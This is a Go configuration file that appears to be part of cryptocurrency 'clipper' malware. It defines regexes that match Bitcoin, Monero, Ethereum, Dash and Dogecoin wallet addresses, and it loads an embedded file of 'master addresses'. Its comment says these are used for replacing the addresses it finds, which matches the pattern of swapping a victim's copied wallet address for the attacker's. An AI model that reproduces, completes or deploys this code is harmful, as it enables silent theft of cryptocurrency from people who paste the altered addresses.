package config

import (
	"embed"
	"encoding/json"
	"fmt"
	"log"
)

type RegexMatch struct {
	CryptoName string `json:"crypto"`
	RegexMatch string `json:"regexMatch"`
}

var (
	RegexMatches = []RegexMatch{
		{
			CryptoName: "btc",
			RegexMatch: "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
		},
		{
			CryptoName: "xmr",
			RegexMatch: "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
		},
		{
			CryptoName: "eth",
			RegexMatch: "^0x[a-fA-F0-9]{40}",
		},
		{
			CryptoName: "dash",
			RegexMatch: "^X[0-9A-HJ-NP-Za-km-z]{33}$",
		},
		{
			CryptoName: "doge",
			RegexMatch: "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
		},
	}
)

//go:embed addresses.json
var jsonFile embed.FS

// Open config/addresses.json, returns string map of cryptoName:addresses
// use this map to lookup replacing addresses
func GetMasterAddresses() (map[string]string, error) {
	file, err := jsonFile.ReadFile("addresses.json")
	if err != nil {
		log.Fatalf("unable to get byteValue, %s", err.Error())
		return nil, err
	}

	var result map[string]interface{}
	err = json.Unmarshal(file, &result)
	if err != nil {
		log.Fatalf("unable to unmarshal config/addresses.json, %s", err.Error())
		return nil, err
	}

	mm := make(map[string]string)
	for k, v := range result {
		mm[k] = fmt.Sprint(v)
	}

	return mm, nil
}
